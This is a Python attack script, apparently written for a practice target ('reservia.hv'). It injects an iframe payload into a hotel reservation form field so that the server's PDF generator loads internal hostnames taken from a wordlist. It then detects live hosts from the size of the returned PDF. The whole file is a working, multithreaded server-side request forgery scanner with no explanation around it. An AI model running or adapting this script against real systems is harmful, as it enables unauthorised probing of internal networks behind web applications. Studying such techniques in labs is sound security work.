import requests
import threading
import re
import argparse
from concurrent.futures import ThreadPoolExecutor

# Cấu hình mặc định
base_url = "http://reservia.hv"
post_url = f"{base_url}/hotels/647f0d2ba9108a79b01c63af"
output_file = "results.txt"
max_threads = 10

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

lock = threading.Lock()

def scan_path(path):
    try:
        payload = {
            "name": "test",
            "email": "test@a.com",
            "dateFrom": "8/4/2025",
            "dateTo": "8/4/2025",
            "guestCount": "1",
            "childrenCount": "0",
            "createdDate": f"<iframe src='http://{path}.hv'></iframe>"
        }

        post_resp = requests.post(post_url, data=payload, headers=headers, timeout=15)
        reservation_id_match = re.search(r'/hotels/reservations/([a-f0-9]{24})', post_resp.text)

        if reservation_id_match:
            reservation_id = reservation_id_match.group(1)
            get_url = f"{base_url}/hotels/reservations/{reservation_id}"
            get_resp = requests.get(get_url, headers=headers, timeout=15)

            content_type = get_resp.headers.get("Content-Type", "")
            content_length = len(get_resp.content)

            #print(f"[+] {path}.hv --> Reservation ID: {reservation_id} | Length: {content_length} bytes")

            if "application/pdf" in content_type and content_length > 27395:
                result_line = f"{reservation_id} {path}.hv [PDF >1MB]"
                print(f"[!!] FOUND LARGE PDF --> {result_line}")
                with lock:
                    with open(output_file, "a") as f:
                        f.write(result_line + "\n")

    except Exception as e:
        print(f"[!] Error scanning path '{path}': {e}")

def main():
    parser = argparse.ArgumentParser(description="Scan for reservation PDF payload injection.")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")

    args = parser.parse_args()
    wordlist_path = args.wordlist

    try:
        with open(wordlist_path, "r") as f:
            paths = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Wordlist file not found: {wordlist_path}")
        return

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(scan_path, paths)

if __name__ == "__main__":
    main()
